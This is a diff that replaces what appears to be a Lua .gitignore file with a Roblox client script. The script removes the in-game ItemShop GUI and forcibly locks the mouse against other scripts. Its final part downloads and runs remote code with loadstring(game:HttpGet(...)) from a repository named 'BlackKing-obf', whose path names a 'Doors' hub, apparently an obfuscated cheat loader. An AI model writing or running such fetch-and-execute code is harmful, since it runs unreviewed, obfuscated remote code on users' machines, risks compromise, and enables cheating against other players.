@@ -1,41 +1,89 @@
-# Compiled Lua sources
-luac.out
+-- Parte 1: Remover ItemShop do PlayerGui e MainUI
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+local function removeItemShop()
+    -- Verificar e remover do PlayerGui
+    if playerGui:FindFirstChild("ItemShop") then
+        playerGui.ItemShop:Destroy()
+    end
+    
+    -- Verificar e remover do MainUI (se existir)
+    if playerGui:FindFirstChild("MainUI") then
+        local mainUI = playerGui.MainUI
+        if mainUI:FindFirstChild("ItemShop") then
+            mainUI.ItemShop:Destroy()
+        end
+    end
+    
+    print("ItemShop removido com sucesso!")
+end
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+removeItemShop()
 
-# Precompiled Headers
-*.gch
-*.pch
+-- Parte 2: Configuração avançada de controle de câmera
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
+local camera = workspace.CurrentCamera
 
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
+-- Configurações
+local MOUSE_SENSITIVITY = 0.3  -- Ajuste conforme necessidade
+local MOUSE_LOCKED = true      -- Deixe sempre true para travar o mouse
 
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+-- Variáveis para controle suave da câmera
+local cameraAngleX = 0
+local cameraAngleY = 0
 
+-- Função para atualizar a rotação da câmera
+local function updateCameraRotation()
+    if not MOUSE_LOCKED then return end
+    
+    -- Pega o movimento do mouse e aplica à câmera
+    local delta = UserInputService:GetMouseDelta()
+    
+    cameraAngleX = cameraAngleX - delta.X * MOUSE_SENSITIVITY * 0.01
+    cameraAngleY = cameraAngleY - delta.Y * MOUSE_SENSITIVITY * 0.01
+    cameraAngleY = math.clamp(cameraAngleY, -math.rad(80), math.rad(80))  -- Limita o ângulo vertical
+    
+    -- Rotaciona a câmera
+    camera.CFrame = CFrame.new(camera.CFrame.Position) 
+        * CFrame.Angles(0, cameraAngleX, 0) 
+        * CFrame.Angles(cameraAngleY, 0, 0)
+end
+
+-- Força o mouse a ficar travado, mesmo se outro script tentar mudar
+local function enforceMouseLock()
+    if MOUSE_LOCKED then
+        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+    end
+end
+
+-- Atualizações constantes para garantir que o mouse não escape
+RunService.RenderStepped:Connect(function()
+    enforceMouseLock()
+    updateCameraRotation()
+end)
+
+-- Caso queira uma tecla para alternar (ex: P)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.P then
+        MOUSE_LOCKED = not MOUSE_LOCKED
+        enforceMouseLock()
+    end
+end)
+
+-- Inicializa travado
+enforceMouseLock()
+
+-- Parte 3: Carregar script externo
+local success, errorMsg = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
+end)
+
+if not success then
+    warn("Falha ao carregar o script externo: " .. errorMsg)
+else
+    print("Script externo carregado com sucesso!")
+end
